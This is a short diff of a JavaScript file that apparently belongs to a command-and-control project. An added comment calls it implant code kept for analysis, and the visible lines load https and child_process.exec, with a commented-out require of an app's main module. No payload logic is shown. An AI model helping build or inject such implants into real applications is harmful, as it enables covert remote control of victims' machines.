@@ -1,3 +1,5 @@
+//this file is not actually used by the C2, this code is implemented in "asargen.py". This script is solely included 1. to provide the implant code for analysis, and 2. because I am not writing an entire JavaScript C2 client inside of a Python string variable.
+
 //const index = require('./{getMainFunc(asarDir)}');
 const https = require('https');
 const exec = require('child_process').exec;
